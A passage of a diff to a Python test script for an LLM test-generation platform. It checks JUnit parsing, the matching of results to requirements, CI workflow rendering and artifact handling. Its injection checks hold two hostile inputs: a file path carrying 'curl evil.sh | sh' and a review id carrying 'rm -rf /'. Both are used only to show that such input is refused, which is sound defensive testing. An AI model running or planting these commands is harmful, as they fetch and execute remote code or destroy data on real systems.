+              "<testcase classname=\"t\" name=\"test_owner_can_update\" time=\"0.01\"/>"
+              "<testcase classname=\"t\" name=\"test_non_owner_gets_403\">"
+              "<failure message=\"assert 200 == 403\">boom</failure></testcase>"
+              "<testcase classname=\"t\" name=\"test_unauth_401\">"
+              "<error message=\"TypeError\">crash</error></testcase>"
+              "<testcase classname=\"t\" name=\"test_theirs\"><skipped/></testcase>"
+              "</testsuite></testsuites>")
+    _rows35 = _tr35.parse_junit(_xml35)
+    check("a JUnit report parses into one row per test case",
+          len(_rows35) == 4, str(len(_rows35)))
+    check("...reading the outcome from the child element, not from an attribute",
+          [r["status"] for r in _rows35] == ["passed", "failed", "errored", "skipped"],
+          str([r["status"] for r in _rows35]))
+    check("a failed assertion and a test that never loaded are counted apart",
+          _tr35.summarise(_rows35)["failed"] == 1
+          and _tr35.summarise(_rows35)["errored"] == 1,
+          "an error usually means a missing import or fixture -- D-316's signature, and "
+          "the number this whole phase exists to make visible")
+    check("an unrecognised status reads as errored, never as a pass",
+          _tr35.normalise_status("weird") == "errored"
+          and _tr35.normalise_status("ok") == "passed",
+          "a producer that invents a status must not be able to make a suite look green")
+    check("a suite of nothing but skips is not a pass",
+          _tr35.summarise([{"status": "skipped", "duration_ms": 0}])["outcome"] == "failed",
+          "this is the field a badge or a CI gate would read")
+
+    # The reconciliation, which is the point of the phase.
+    _gen35 = {"requirement_coverage": [
+        {"requirement_ref": "owner may update", "covered": True,
+         "test_names": ["test_owner_can_update"]},
+        {"requirement_ref": "non-owner blocked", "covered": True,
+         "test_names": ["test_non_owner_gets_403"]},
+        {"requirement_ref": "attempt is audited", "covered": True,
+         "test_names": ["test_audit_row_written"]}]}
+    _map35, _unmatched35 = _tr35.map_to_requirements(_gen35, _rows35)
+    _by35 = {row["requirement_ref"]: row["outcome"] for row in _map35}
+    check("a requirement whose tests passed is reported passed",
+          _by35.get("owner may update") == "passed", str(_by35))
+    check("...one whose test failed is reported failed",
+          _by35.get("non-owner blocked") == "failed", str(_by35))
+    check("...and one the model CLAIMED to cover, that nothing ran, is not_run",
+          _by35.get("attempt is audited") == "not_run",
+          f"{_by35} -- this is the verdict that did not exist before results came back, and "
+          "the reason the phase is worth building: a claim nobody could contradict")
+    check("...while the claim itself is still shown beside the outcome",
+          all(row["claimed_covered"] is True for row in _map35),
+          "the disagreement between claimed and observed is the finding")
+    check("the customer's own tests are counted, not mistaken for ours",
+          _unmatched35 == 2,
+          f"{_unmatched35} -- their suite runs alongside the generated one; dropping those "
+          "silently would make a broad report look narrow")
+
+    # Names never match character for character: pytest reports `test_x`, Jest reports the
+    # whole `describe > it` sentence. A missed match understates coverage, which is the
+    # direction that makes a reader distrust a real result -- so matching is deliberately
+    # loose, and this is the check that keeps it that way.
+    _loose35, _ = _tr35.map_to_requirements(
+        {"requirement_coverage": [{"requirement_ref": "r", "covered": True,
+                                   "test_names": ["owner can update their own task"]}]},
+        [{"name": "Task ownership > PUT > owner can update their own task",
+          "status": "passed", "duration_ms": 1}])
+    check("a Jest sentence matches the test name the generation recorded",
+          _loose35[0]["outcome"] == "passed", str(_loose35))
+
+    # Refusals. Everything arriving here is untrusted HTTP input.
+    for _label35, _bad35 in (
+            ("not XML at all", {"junit_xml": "<nope"}),
+            ("an empty report", {"junit_xml": "   "}),
+            ("a report with no test cases", {"junit_xml": "<testsuite/>"}),
+            ("both forms at once", {"junit_xml": "<testsuite/>",
+                                    "results": [{"name": "x", "status": "passed"}]}),
+            ("neither form", {}),
+            ("results that are not a list", {"results": "passed"}),
+            ("a result with no name", {"results": [{"status": "passed"}]})):
+        try:
+            _tr35.ingest({"review_type": "test_automation", "result": {}}, _bad35, "t")
+            check(f"{_label35} is refused", False, "it was accepted")
+        except _tr35.TestResultError:
+            check(f"{_label35} is refused with a reason, not a crash", True)
+
+    try:
+        _tr35.ingest({"review_type": "code", "result": {}},
+                     {"results": [{"name": "x", "status": "passed"}]}, "t")
+        check("results cannot be attached to a run that generated no tests", False)
+    except _tr35.TestResultError:
+        check("results cannot be attached to a run that generated no tests", True,
+              "deny-by-default on review_type, the same shape as _DELIVERABLE_RUNS")
+
+    from fastapi.testclient import TestClient as _TC35
+    _m34.llm_settings_service.is_llm_configured = lambda: True
+    with _TC35(_m34.app, raise_server_exceptions=False) as _c35:
+        _t35 = _c35.post("/api/auth/login",
+                         json={"username": "admin",
+                               "password": config.DEFAULT_ADMIN_PASSWORD}).json()["token"]
+        _p35 = _c35.post("/api/v1/projects", json={"name": "S35"},
+                         headers={"Authorization": f"Bearer {_t35}"}).json()["project"]["id"]
+        _H35 = {"Authorization": f"Bearer {_t35}", "X-Project-Id": _p35}
+        _prev35 = llm_gateway.call_tool
+        llm_gateway.call_tool = lambda *a, **k: {
+            "levels_chosen": [{"level": "Unit", "rationale": "r"}],
+            "test_files": [{"path": "tests/t.py", "framework": "pytest", "level": "Unit",
+                            "prerequisites": ["none"], "content": "def test_a():\n    pass\n",
+                            "test_names": ["test_owner_can_update"], "covers": ["c"]}],
+            "requirement_coverage": [{"requirement_ref": "owner may update", "covered": True,
+                                      "test_names": ["test_owner_can_update"]}],
+            "not_automated": [], "assumptions": [], "summary": "s"}
+        try:
+            _g35 = _c35.post("/api/review/test-automation", headers=_H35, json={
+                "requirement": "A task may only be updated by its owner.",
+                "files": [{"path": "app.py", "content": "def update():\n    return 1\n"}]})
+            check("a generation to report against", _g35.status_code == 200,
+                  f"{_g35.status_code} {_g35.text[:200]}")
+            _rid35 = _g35.json().get("review_id")
+            check("...which starts life saying nothing was executed",
+                  _g35.json().get("execution_status") == "not_executed")
+
+            _pre35 = _c35.get(f"/api/reviews/{_rid35}/test-results", headers=_H35).json()
+            check("...and reads back as not_executed before any report",
+                  _pre35["execution_status"] == "not_executed" and not _pre35["runs"],
+                  str(_pre35)[:160])
+
+            _n35 = len(_calls34)
+            _rep35 = _c35.post(f"/api/reviews/{_rid35}/test-results", headers=_H35,
+                               json={"junit_xml": _xml35, "source_label": "Actions run 1"})
+            check("a report is accepted", _rep35.status_code == 200,
+                  f"{_rep35.status_code} {_rep35.text[:220]}")
+            check("...calling no model, because recording an outcome is not a generation",
+                  len(_calls34) == _n35, "reporting a result must never be billable")
+            _rj35 = _rep35.json()
+            check("...and answering with the reconciliation, not an acknowledgement",
+                  [r["outcome"] for r in _rj35["requirements"]] == ["passed"],
+                  str(_rj35.get("requirements"))[:200])
+            check("...never claiming the platform verified any of it",
+                  _rj35.get("attested") is False,
+                  "this endpoint is the one place the platform could be mistaken for having "
+                  "checked something, and it did not: it was told")
+
+            _post35 = _c35.get(f"/api/reviews/{_rid35}/test-results", headers=_H35).json()
+            check("the run now reads as reported rather than not executed",
+                  _post35["execution_status"] == "reported", str(_post35)[:120])
+            check("...with the failures listed first",
+                  [r["status"] for r in _post35["latest"]["results"]][:2]
+                  == ["failed", "errored"],
+                  f"{[r['status'] for r in _post35['latest']['results']]} -- a reader of 400 "
+                  "tests wants the broken ones, and making them scroll is how red gets ignored")
+            check("...and who reported it, because a pass with no attribution proves nothing",
+                  _post35["latest"]["reported_by"] and _post35["latest"]["source_label"],
+                  str(_post35["latest"])[:160])
+
+            _c35.post(f"/api/reviews/{_rid35}/test-results", headers=_H35,
+                      json={"results": [{"name": "test_owner_can_update", "status": "passed"}]})
+            _hist35 = _c35.get(f"/api/reviews/{_rid35}/test-results", headers=_H35).json()
+            check("a second report is kept beside the first, not written over it",
+                  len(_hist35["runs"]) == 2,
+                  f"{len(_hist35['runs'])} -- 'this used to pass' is a fact one snapshot "
+                  "cannot express")
+            check("...newest first",
+                  _hist35["runs"][0]["outcome"] == "passed"
+                  and _hist35["runs"][1]["outcome"] == "failed",
+                  str([r["outcome"] for r in _hist35["runs"]]))
+
+            check("results cannot be filed against a run that does not exist",
+                  _c35.post("/api/reviews/nope/test-results", headers=_H35,
+                            json={"results": [{"name": "x", "status": "passed"}]}
+                            ).status_code == 404)
+            _bad35 = _c35.post(f"/api/reviews/{_rid35}/test-results", headers=_H35,
+                               json={"junit_xml": "<nope"})
+            check("...and a malformed report is a 400 with a reason, never a 500",
+                  _bad35.status_code == 400, f"{_bad35.status_code} {_bad35.text[:150]}")
+        finally:
+            llm_gateway.call_tool = _prev35
+
+    # ══ 36. And a way to actually run them ═════════════════════════════════
+    #
+    # Phase 3. Phase 2's endpoint was open for anybody to post to and nobody had, because
+    # "run them and post the result" is three unstated decisions -- which command, which
+    # JUnit flag, which URL. This is the platform answering all three from what it already
+    # knows: the framework it wrote every file for.
+    #
+    # Nothing here runs a test either (D-05). What is checked is that the rendered command
+    # is one a machine could run, that everything it cannot do is stated rather than
+    # guessed at, and that nothing a model wrote reaches a shell unchecked.
+    section("36. How to run them: a CI workflow and a local command, both free")
+
+    from backend.services import test_runner_plan as _trp
+
+    _files36 = [
+        {"path": "tests/test_owner.py", "framework": "pytest",
+         "prerequisites": ["running application", "database"]},
+        {"path": "tests/e2e/login.spec.js", "framework": "Playwright",
+         "prerequisites": ["browser"]},
+        {"path": "tests/x y.py", "framework": "pytest", "prerequisites": []},
+        {"path": "tests/z.rb", "framework": "Homegrown 9", "prerequisites": []},
+        "a response row that is a string, not an object",
+    ]
+    _plan36 = _trp.plan_for(_files36)
+    check("a framework the table knows becomes a runnable command",
+          [j["framework"] for j in _plan36["jobs"]] == ["pytest", "playwright"],
+          str([j["framework"] for j in _plan36["jobs"]]))
+    check("...built from a lookup rather than a second model call",
+          _plan36["jobs"][0]["argv"][:3] == ["python", "-m", "pytest"],
+          "a command written by a model would be wrong differently every time, cost money, "
+          "and put model-written shell in a file somebody else's CI executes")
+    check("...and the local argv and the CI shell string say the same thing",
+          _plan36["jobs"][0]["shell"] == " ".join(_plan36["jobs"][0]["argv"]),
+          "a local green and a CI green have to mean the same run")
+    check("a path with a shell character in it is refused, not quoted",
+          _plan36["unsafe_paths"] == ["tests/x y.py"],
+          "these paths are written by a model and end up in a command on a machine we have "
+          "never seen; 'tests/a.py; curl evil.sh | sh' is a path as far as JSON is concerned")
+    check("...and the refusal is reported, because that file is now uncovered",
+          bool(_plan36["unsafe_paths"]), "a silent skip makes a narrow run look complete")
+    check("a framework nobody here knows is named, never guessed at",
+          _plan36["unknown_frameworks"] == ["Homegrown 9"],
+          str(_plan36["unknown_frameworks"]))
+    check("a response row that is not an object is ignored rather than crashing",
+          len(_plan36["jobs"]) == 2, "the live shape from D-392, in a second reader")
+    check("what no CI runner can supply is stated up front",
+          _plan36["must_supply"] == ["database", "running application"],
+          f"{_plan36['must_supply']} -- C-63, named before the job goes red rather than "
+          "discovered from it")
+    check("...but a browser is not on that list, because Playwright installs one",
+          "browser" not in _plan36["must_supply"], str(_plan36["must_supply"]))
+    check("a framework whose JUnit output needs an extra package says so",
+          _trp.plan_for([{"path": "a.test.js", "framework": "Jest"}])["extra_packages"]
+          == ["jest-junit"],
+          "without it the runner works, writes nothing, and the suite reads as never run")
+
+    _wf36 = _trp.render_workflow(
+        "run-36", "https://sdlc.example.com/api/reviews/run-36/test-results", _plan36)
+    check("the workflow reports even when nothing ran",
+          "suite did not run" in _wf36,
+          "a report that stops arriving looks exactly like a suite that stopped failing, "
+          "and every requirement would keep its unchallenged claim of coverage")
+    check("...runs its report step whatever the tests did",
+          "if: always()" in _wf36, "the failing run IS the payload")
+    check("...takes the key from a repository secret and never writes it down",
+          f"secrets.{_trp.API_KEY_SECRET}" in _wf36 and "${{ secrets." in _wf36)
+    check("...and asks for nothing it does not need",
+          "contents: read" in _wf36, "this job reports; it never writes to the repository")
+
+    # The script the workflow embeds is the one piece of this that a customer's runner
+    # executes and no offline test can otherwise see. A syntax error in it would be found
+    # by them, as a job that reports nothing.
+    _emb36 = _wf36.split("python3 - <<'LM_REPORT_PY'", 1)[-1].split("LM_REPORT_PY", 1)[0]
+    _emb36 = "\n".join(l[10:] if l.startswith(" " * 10) else l for l in _emb36.split("\n"))
+    try:
+        compile(_emb36, "<embedded report step>", "exec")
+        check("the report script embedded in the workflow is valid Python", True,
+              "the only part of this that runs on a machine we cannot see")
+    except SyntaxError as _exc36:
+        check("the report script embedded in the workflow is valid Python", False, str(_exc36))
+
+    # Two producers of one contract (D-62) means two copies of the merge: the workflow
+    # cannot import this repo. This is the check that stops them drifting apart.
+    _docs36 = ['<testsuite name="a"><testcase name="t1"/></testsuite>',
+               '<testsuites><testsuite name="b"><testcase name="t2"/></testsuite></testsuites>',
+               "<not xml at all"]
+    _merged36 = _trp.merge_junit(_docs36)
+    check("several runners' reports merge into the one report the endpoint takes",
+          _merged36.count("<testsuite ") == 2 and "t2" in _merged36,
+          "posting them separately would file two runs against one execution, and every "
+          "requirement covered by the other half would read as not_run -- the phase's most "
+          "important verdict, wrong")
+    check("...and an unreadable file does not cost us the readable ones",
+          "t1" in _merged36, _merged36[:120])
+    check("...with nothing to merge reported as nothing, not as an empty pass",
+          _trp.merge_junit(["<nope"]) == "")
+
+    # Node's own junit reporter puts <testcase> directly under the root with no <testsuite>
+    # wrapper at all. The first version of the merge collected only <testsuite> elements, so
+    # every case in such a file was dropped and the run reported "no results" -- which reads
+    # as a suite that never ran. Found by the first run of `eval_test_automation.py`, on a
+    # suite that had run and failed exactly as it should have (C-93).
+    _node37 = ('<testsuites><testcase name="owner may update" time="0.01" classname="test"/>'
+               '<testcase name="non-owner blocked" classname="test">'
+               '<failure type="testCodeFailure" message="200 !== 403">x</failure>'
+               '</testcase></testsuites>')
+    _nm37 = _trp.merge_junit([_node37])
+    check("a report with no <testsuite> wrapper is wrapped, not discarded",
+          _nm37.count("<testsuite ") == 1 and "non-owner blocked" in _nm37,
+          "Node emits this shape; dropping it reports a suite that ran as one that did not")
+    _nr37 = _tr35.parse_junit(_nm37)
+    check("...and reads back as the tests it holds",
+          [r["status"] for r in _nr37] == ["passed", "failed"],
+          str([(r["name"], r["status"]) for r in _nr37]))
+    check("...while a genuinely empty report is still nothing",
+          _trp.merge_junit(["<testsuites></testsuites>"]) == "",
+          "no cases and no suites is not a pass")
+    _ET36 = __import__("xml.etree.ElementTree", fromlist=["ElementTree"])
+    _ci36 = _ET36.Element("testsuites")
+    for _t36 in _docs36[:2]:
+        _r36 = _ET36.fromstring(_t36)
+        for _s36 in ([_r36] if _r36.tag == "testsuite" else list(_r36.iter("testsuite"))):
+            _ci36.append(_s36)
+    check("the workflow's own copy of that merge agrees with this one",
+          _ET36.tostring(_ci36, encoding="unicode").count("<testsuite ")
+          == _merged36.count("<testsuite "),
+          "the workflow carries its own because a GitHub runner cannot import this file; "
+          "that copy is the one that can drift unnoticed")
+
+    for _label36, _bad36 in (("a URL a shell could break out of", "https://x.com/a b"),
+                             ("something that is not a URL at all", "sdlc.example.com")):
+        try:
+            _trp.render_workflow("run-36", _bad36, _plan36)
+            check(f"{_label36} is refused", False, "it was rendered")
+        except ValueError:
+            check(f"{_label36} is refused rather than escaped", True,
+                  "modernization_pr._yaml_scalar's rule, and for the same reason")
+    try:
+        _trp.render_workflow("run 36; rm -rf /", "https://x.com/a", _plan36)
+        check("a review id that is not an identifier is refused", False)
+    except ValueError:
+        check("a review id that is not an identifier is refused", True)
+    try:
+        _trp.render_workflow("run-36", "https://x.com/a",
+                             _trp.plan_for([{"path": "a.rb", "framework": "Homegrown"}]))
+        check("a suite with no runnable framework renders nothing", False)
+    except ValueError:
+        check("a suite with no runnable framework renders nothing rather than a stub",
+              True, "a workflow that runs no tests and reports green is the worst outcome")
+
+    _m34.llm_settings_service.is_llm_configured = lambda: True
+    with _TC35(_m34.app, raise_server_exceptions=False) as _c36:
+        _t36 = _c36.post("/api/auth/login",
+                         json={"username": "admin",
+                               "password": config.DEFAULT_ADMIN_PASSWORD}).json()["token"]
+        _p36 = _c36.post("/api/v1/projects", json={"name": "S36"},
+                         headers={"Authorization": f"Bearer {_t36}"}).json()["project"]["id"]
+        _H36 = {"Authorization": f"Bearer {_t36}", "X-Project-Id": _p36}
+        _prev36 = llm_gateway.call_tool
+        llm_gateway.call_tool = lambda *a, **k: {
+            "levels_chosen": [{"level": "Unit", "rationale": "r"}],
+            "test_files": [{"path": "tests/t.py", "framework": "pytest", "level": "Unit",
+                            "prerequisites": ["database"], "content": "def test_a():\n    pass\n",
+                            "test_names": ["test_a"], "covers": ["c"]}],
+            "requirement_coverage": [{"requirement_ref": "r", "covered": True,
+                                      "test_names": ["test_a"]}],
+            "not_automated": [], "assumptions": [], "summary": "s"}
+        try:
+            _g36 = _c36.post("/api/review/test-automation", headers=_H36, json={
+                "requirement": "A task may only be updated by its owner.",
+                "files": [{"path": "app.py", "content": "def update():\n    return 1\n"}]})
+            _rid36 = _g36.json().get("review_id")
+            _n36 = len(_calls34)
+
+            _r36 = _c36.get(f"/api/reviews/{_rid36}/runner?callback_url="
+                            f"https://sdlc.example.com/api/reviews/{_rid36}/test-results",
+                            headers=_H36)
+            check("a finished generation can be asked how to run itself",
+                  _r36.status_code == 200, f"{_r36.status_code} {_r36.text[:200]}")
+            check("...calling no model, because a lookup is not a generation",
+                  len(_calls34) == _n36, "nothing on this path may be billable")
+            _rj36 = _r36.json()
+            check("...answering with a command a developer can paste",
+                  _rj36["local_command"].startswith("python scripts/run_tests.py --review"),
+                  str(_rj36.get("local_command")))
+            check("...and a workflow that reports to this run, not to a run in general",
+                  _rid36 in (_rj36.get("workflow_yaml") or ""), "the URL carries the id")
+            check("...naming what it cannot supply, on the object a screen renders",
+                  _rj36["must_supply"] == ["database"], str(_rj36.get("must_supply")))
+            check("...and never claiming the platform will run any of it",
+                  _rj36.get("attested") is False)
+
+            _loop36 = _c36.get(f"/api/reviews/{_rid36}/runner"
+                               f"?callback_url=http://localhost:8000/x", headers=_H36).json()
+            check("a callback a CI runner cannot reach is not used as one",
+                  _loop36["report_mode"] == "artifact"
+                  and "http://localhost:8000/x" not in (_loop36["workflow_yaml"] or ""),
+                  f"{_loop36.get('report_mode')} -- a workflow reporting there would run, "
+                  "fail to post, and look exactly like a suite nobody triggered")
+            check("...but a workflow is still rendered, in the mode that needs no address",
+                  bool(_loop36["workflow_yaml"])
+                  and "artifact" in (_loop36["report_mode_note"] or ""),
+                  "refusing outright is right for the compiler callback, which has no second "
+                  "route home; this one does, so refusing would leave every local deployment "
+                  "with no CI at all")
+
+            check("a run that generated no tests has no runner to describe",
+                  _c36.get("/api/reviews/nope/runner", headers=_H36).status_code == 404)
+        finally:
+            llm_gateway.call_tool = _prev36
+
+    # ══ 37. The loop closes without a public address ═══════════════════════
+    #
+    # A CI runner cannot reach a platform on a laptop or behind a firewall, so the results
+    # travel the other way: the workflow saves them as its own artifact and the platform
+    # goes and gets them. Every call is outbound, which is what makes it work at all.
+    #
+    # The checks that matter most here are the two a real GitHub Actions run found, because
+    # neither is visible to a YAML parser: a mapping left empty by commenting out its only
+    # entries, and an artifact that has to be read the same way it was written.
+    section("37. Results fetched from GitHub, and the tests delivered as a pull request")
+
+    import zipfile as _zip37
+
+    _plan37 = _trp.plan_for([{"path": "tests/a.test.js", "framework": "Jest",
+                              "prerequisites": ["none"]}])
+    _cb37 = _trp.render_workflow("r37", "https://sdlc.example.com/x", _plan37)
+    _ar37 = _trp.render_workflow("r37", "", _plan37)
+
+    check("a workflow renders with no address to report to",
+          bool(_ar37) and "      LM_RESULTS_URL:" not in _ar37,
+          "this is the mode for a platform a runner cannot reach -- a laptop, a private "
+          "network, anything behind a firewall")
+    check("...saving its results as the artifact instead of posting them",
+          "lm-merged.xml" in _ar37 and _trp.ARTIFACT_NAME in _ar37,
+          "the artifact IS the report in this mode, not a backup of one")
+    check("...and asking for no API key, because it sends nothing",
+          "secrets." + _trp.API_KEY_SECRET not in _ar37,
+          "a secret nobody needs is a step nobody completes")
+    check("...while the reporting mode still does both",
+          "secrets." + _trp.API_KEY_SECRET in _cb37
+          and "      LM_RESULTS_URL:" in _cb37)
+    check("...and both name the run they belong to",
+          "r37" in _ar37 and "r37" in _cb37)
+
+    # The defect a real Actions run found, and the only check here written from evidence
+    # rather than reasoning. With its examples commented out, `env:` parsed as null; GitHub
+    # rejects a workflow whose `env` is not a mapping *before creating any job*, so the run
+    # came back as a bare failure with no steps, no logs and no artifact -- indistinguishable
+    # at a glance from a suite that failed. `yaml.safe_load` accepts it happily.
+    for _label37, _yaml37 in (("with an address to report to", _cb37),
+                              ("with none", _ar37)):
+        _envs37 = [n for n, l in enumerate(_yaml37.split("\n")) if l.strip() == "env:"]
+        _empty37 = []
+        for _n37 in _envs37:
+            _ind37 = len(_yaml37.split("\n")[_n37]) - len(_yaml37.split("\n")[_n37].lstrip())
+            for _next37 in _yaml37.split("\n")[_n37 + 1:]:
+                if not _next37.strip() or _next37.strip().startswith("#"):
+                    continue
+                if len(_next37) - len(_next37.lstrip()) <= _ind37:
+                    _empty37.append(_n37)
+                break
+        check(f"no env block is left empty by its comments, {_label37}",
+              not _empty37,
+              "C-92: GitHub rejects `env:` with no entries before it creates a job, so the "
+              "run reads as a failed test suite rather than a malformed file")
+    try:
+        _trp._check_mappings(["    env:", "      # only a comment", "    steps:"])
+        check("...and the renderer refuses to emit one", False, "it was allowed")
+    except ValueError:
+        check("...and the renderer refuses to emit one rather than trusting the caller", True)
+    _trp._check_mappings(["on:", "  workflow_dispatch:", "  push:", "    branches: x"])
+    check("...without flagging a key that is legitimately empty",
+          True, "`on: {workflow_dispatch:}` is null on purpose and must stay allowed")
+
+    # Reading the artifact back. Untrusted input from outside the platform.
+    def _zip37f(files):
+        buf = io.BytesIO()
+        with _zip37.ZipFile(buf, "w") as archive:
+            for name, content in files:
+                archive.writestr(name, content)
+        return buf.getvalue()
+
+    _one37 = '<testsuite name="a"><testcase name="t1"/></testsuite>'
+    _mrg37 = ('<testsuites><testsuite name="m"><testcase name="t9"/></testsuite>'
+              '</testsuites>')
+    check("the merged file the workflow wrote is preferred over the parts",
+          "t9" in _trp.read_artifact_zip(_zip37f([("jest.xml", _one37),
+                                                  ("lm-merged.xml", _mrg37)])),
+          "what is filed should be exactly what the run produced, not a second merge of it")
+    check("...and it is not wrapped a second time",
+          _trp.read_artifact_zip(
+              _zip37f([("lm-merged.xml", _mrg37)])).count("<testsuites>") == 1,
+          "nesting testsuites inside testsuites loses every suite for a strict reader")
+    check("...but several parts still merge when there is no merged file",
+          _trp.read_artifact_zip(
+              _zip37f([("a.xml", _one37), ("b.xml", _one37)])).count("<testsuite ") == 2)
+    for _label37, _bad37 in (("something that is not a zip", b"not a zip"),
+                             ("a zip with no XML in it", _zip37f([("build.log", "x")])),
+                             ("a zip whose XML holds no suites",
+                              _zip37f([("a.xml", "<nope")]))):
+        try:
+            _trp.read_artifact_zip(_bad37)
+            check(f"{_label37} is refused", False, "it was accepted")
+        except ValueError:
+            check(f"{_label37} is refused with a reason, not a crash", True)
+    check("an artifact holding more XML than a test report ever does is refused",
+          _trp.MAX_ARTIFACT_UNPACKED <= 20 * 1024 * 1024
+          and _trp.MAX_ARTIFACT_MEMBERS <= 200,
+          "this is a zip from outside the platform; a report is kilobytes")
+
+    with _TC35(_m34.app, raise_server_exceptions=False) as _c37:
+        _t37 = _c37.post("/api/auth/login",
+                         json={"username": "admin",
+                               "password": config.DEFAULT_ADMIN_PASSWORD}).json()["token"]
+        _p37 = _c37.post("/api/v1/projects", json={"name": "S37"},
+                         headers={"Authorization": f"Bearer {_t37}"}).json()["project"]["id"]
+        _H37 = {"Authorization": f"Bearer {_t37}", "X-Project-Id": _p37}
+        _prev37 = llm_gateway.call_tool
+        llm_gateway.call_tool = lambda *a, **k: {
+            "levels_chosen": [{"level": "Unit", "rationale": "r"}],
+            "test_files": [{"path": "tests/t.py", "framework": "pytest", "level": "Unit",
+                            "prerequisites": ["none"], "content": "def test_a():\n    pass\n",
+                            "test_names": ["test_a"], "covers": ["c"]}],
+            "requirement_coverage": [{"requirement_ref": "r", "covered": True,
+                                      "test_names": ["test_a"]}],
+            "not_automated": [],
+            "assumptions": [{"assumption": "the login route is POST /login",
+                             "risk_if_wrong": "every auth test fails at setup"}],
+            "summary": "s"}
+        try:
+            _g37 = _c37.post("/api/review/test-automation", headers=_H37, json={
+                "requirement": "A task may only be updated by its owner.",
+                "files": [{"path": "app.py", "content": "def update():\n    return 1\n"}]})
+            _rid37 = _g37.json().get("review_id")
+
+            # With no PUBLIC_BASE_URL set, the runner endpoint used to refuse outright. Now
+            # it renders the mode that needs no address at all -- which is the whole point.
+            _prevbase37 = config.PUBLIC_BASE_URL
+            config.PUBLIC_BASE_URL = ""
+            try:
+                _r37 = _c37.get(f"/api/reviews/{_rid37}/runner", headers=_H37).json()
+                check("a deployment with no public address still gets a workflow",
+                      bool(_r37.get("workflow_yaml")) and not _r37.get("callback_url"),
+                      f"{str(_r37.get('blocked_reason'))[:80]} -- refusing here would leave "
+                      "every local deployment with no CI at all")
+                check("...one that fetches rather than reports",
+                      "lm-merged.xml" in (_r37.get("workflow_yaml") or ""))
+            finally:
+                config.PUBLIC_BASE_URL = _prevbase37
+
+            _n37 = len(_calls34)
+            _f37 = _c37.post(f"/api/reviews/{_rid37}/test-results/from-actions", headers=_H37,
+                             json={"github_repo_url": "https://github.com/o/does-not-exist"})
+            check("fetching from a repository no credential can see fails with a reason",
+                  _f37.status_code in (400, 502),
+                  f"{_f37.status_code} {_f37.text[:160]}")
+            check("...calling no model on the way, because none of this is a generation",
+                  len(_calls34) == _n37, "every door on this loop must stay free")
+            check("...and results cannot be fetched for a run that generated no tests",
+                  _c37.post("/api/reviews/nope/test-results/from-actions", headers=_H37,
+                            json={"github_repo_url": "https://github.com/o/r"}
+                            ).status_code == 404)
+
+            _d37 = _c37.post(f"/api/reviews/{_rid37}/deliver-tests", headers=_H37,
+                             json={"github_repo_url": "not-a-repo-url"})
+            check("delivering to something that is not a repository is refused",
+                  _d37.status_code == 400, f"{_d37.status_code} {_d37.text[:120]}")
+
+            # The pull request body is the last place a reader is told what this is, and the
+            # only one they cannot avoid seeing.
+            _body37 = _m34._tests_pr_body(
+                _rid37,
+                {"test_files": [{"path": "tests/t.py", "test_names": ["test_a"]}],
+                 "requirement_coverage": [{"requirement_ref": "audited", "covered": False,
+                                           "note": "no audit table in the source"}],
+                 "assumptions": [{"assumption": "login is POST /login",
+                                  "risk_if_wrong": "auth tests fail at setup"}],
+                 "summary": "s"},
+                _trp.plan_for([{"path": "tests/t.py", "framework": "pytest",
+                                "prerequisites": ["database"]}]),
+                "saves its results as a workflow artifact")
+            check("the pull request says nobody has run these",
+                  "never run" in _body37.lower()
+          and "Nothing here has been executed" in _body37,
+                  "the failure mode is a reviewer reading a generated test as a verified one")
+            check("...carries the assumptions the model declared",
+                  "login is POST /login" in _body37,
+                  "a risk stated on a screen nobody opens is not stated")
+            check("...names the requirements the suite does not cover",
+                  "no audit table in the source" in _body37,
+                  "counting files and assuming is what this replaces")
+            check("...and what no runner will supply",
+                  "database" in _body37, _body37[:200])
+        finally:
+            llm_gateway.call_tool = _prev37
+
+    # ══ 38. Nobody has to remember to fetch ════════════════════════════════
+    #
+    # A pull nobody performs is not a loop. Phase 2's promise was a *trend* -- reports kept
+    # rather than overwritten so "this used to pass" is expressible -- and a trend needs the
+    # reports to arrive while GitHub still holds them, because artifacts expire.
+    #
+    # There is no scheduler in this deployment, so this runs where the other time-based
+    # passes run: on the read that depends on it. What is checked here is that it never
+    # makes the read worse -- no double filing, no repeated pointless calls, and no GitHub
+    # problem turned into something the reader has to think about.
+    section("38. New CI results are collected without being asked for")
+
+    from backend.services import test_results_pull as _tp38
+
+    _c38 = None
+    check("a run nothing was delivered from is left alone",
+          _tp38.pull_latest("no-such-review")["why"] == "nothing was delivered from this run",
+          "no delivery means no repository to look in, and guessing one would be a write to "
+          "somebody's account on a hunch")
+
+    _now38 = __import__("datetime").datetime.now(__import__("datetime").timezone.utc)
+    check("a delivery looked at moments ago is not looked at again",
+          not _tp38._due({"last_fetch_at": _now38.isoformat()}),
+          "a screen somebody is clicking around must not start a thread per render")
+    check("...one never looked at is due immediately",
+          _tp38._due({}), "the first read after a delivery is the interesting one")
+    check("...and an unreadable timestamp counts as due, not as recent",
+          _tp38._due({"last_fetch_at": "not a date"}),
+          "failing closed here would mean never looking again")
+
+    with _TC35(_m34.app, raise_server_exceptions=False) as _c38:
+        _t38 = _c38.post("/api/auth/login",
+                         json={"username": "admin",
+                               "password": config.DEFAULT_ADMIN_PASSWORD}).json()["token"]
+        _p38 = _c38.post("/api/v1/projects", json={"name": "S38"},
+                         headers={"Authorization": f"Bearer {_t38}"}).json()["project"]["id"]
+        _H38 = {"Authorization": f"Bearer {_t38}", "X-Project-Id": _p38}
+        _prev38 = llm_gateway.call_tool
+        llm_gateway.call_tool = lambda *a, **k: {
+            "levels_chosen": [{"level": "Unit", "rationale": "r"}],
+            "test_files": [{"path": "tests/t.py", "framework": "pytest", "level": "Unit",
+                            "prerequisites": ["none"], "content": "def test_a():\n    pass\n",
+                            "test_names": ["test_a"], "covers": ["c"]}],
+            "requirement_coverage": [{"requirement_ref": "r", "covered": True,
+                                      "test_names": ["test_a"]}],
+            "not_automated": [], "assumptions": [], "summary": "s"}
+        try:
+            _g38 = _c38.post("/api/review/test-automation", headers=_H38, json={
+                "requirement": "A task may only be updated by its owner.",
+                "files": [{"path": "app.py", "content": "def update():\n    return 1\n"}]})
+            _rid38 = _g38.json().get("review_id")
+
+            _r38 = _c38.get(f"/api/reviews/{_rid38}/test-results", headers=_H38).json()
+            check("a run with no delivery says so rather than inventing one",
+                  _r38["delivery"] is None, str(_r38.get("delivery")))
+
+            database.save_test_delivery(_rid38, _p38, "https://github.com/o/r", "br",
+                                        "https://github.com/o/r/pull/1")
+            _r38 = _c38.get(f"/api/reviews/{_rid38}/test-results", headers=_H38).json()
+            check("once delivered, the screen is told where results will come from",
